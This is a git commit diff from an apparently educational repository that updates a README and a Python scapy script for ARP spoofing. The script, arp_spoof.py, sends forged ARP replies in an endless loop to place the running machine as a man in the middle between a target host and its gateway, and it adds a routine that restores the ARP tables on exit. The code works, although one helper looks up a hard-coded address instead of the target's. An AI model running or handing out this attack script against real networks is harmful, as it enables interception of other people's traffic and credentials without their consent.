0cc8140d29b25291bb5ea358a0c3a9c0cfbbd495
root <barcaenrique7@gmail.com>
2023-09-01 17:02:10 -0400

    Updating README, refactoring script and nes restore arp table method

--- README.md
+++ README.md
@@ -145,7 +145,7 @@ Let's imagine a scenario with three devices: Device A (attacker), Device B (vict
 
 *** ADD A SPOOFING NETWORK IMAGE HERE ***
 
-# [Arp spoof script](arp_spoof.py):
+## [Arp spoof script](arp_spoof.py):
 
 ##Objective:
 - Redirect the flow of other packets, of other devices, through our computer.
--- arp_spoof.py
+++ arp_spoof.py
@@ -13,10 +13,25 @@ def get_mac(ip):
     return answered_list[0][1].hwsrc
 def spoof(target_ip, spoof_if):
     target_mac = get_mac("192.168.5.2")
-    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_if)
+    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_if)  #Our Source MAC address automatically set by scapy
     scapy.send(arp_packet)
 
-while True: # We have to keep sending the packets to keep being 'the man in the middle'
-    spoof("10.0.3.7","10.0.3.1") # target_computer_ip, router_ip, tell the target I'm the router
-    spoof("10.0.3.1","10.0.3.7") # router_ip, target_computer_ip, tell the router I'm the computer
-    time.sleep(2) # To avoid sending too many packets
+def restore_arp_table(destination_ip, source_ip): # Target and router IPs
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
+                       psrc=source_ip, hwsrc=source_mac) # Important Set the MAC address os the source (hwsrc) to avoid scapy pick our
+    scapy.send(packet, count=4, verbose=False) # We will send the packet 4 times (count=4) to make sure is received
+
+target_ip = "10.0.3.7"
+gateway_router_ip = "10.0.3.1"
+try:
+    packets_sent_count = 0
+    while True: # We have to keep sending the packets to keep being 'the man in the middle'
+        spoof(target_ip, gateway_router_ip) # target_computer_ip, router_ip, tell the target I'm the router
+        spoof(gateway_router_ip, target_ip) # router_ip, target_computer_ip, tell the router I'm the computer
+        time.sleep(2) # To avoid sending too many packets
+except KeyboardInterrupt: # KeyboardInterrupt is the error thrown when click Ctrl + c
+    print("\n[-] Ctrl + C pressed... Restoring ARP tables...Pleas wait....\n")
+    restore_arp_table(gateway_router_ip, target_ip)
+    restore_arp_table(target_ip, gateway_router_ip)
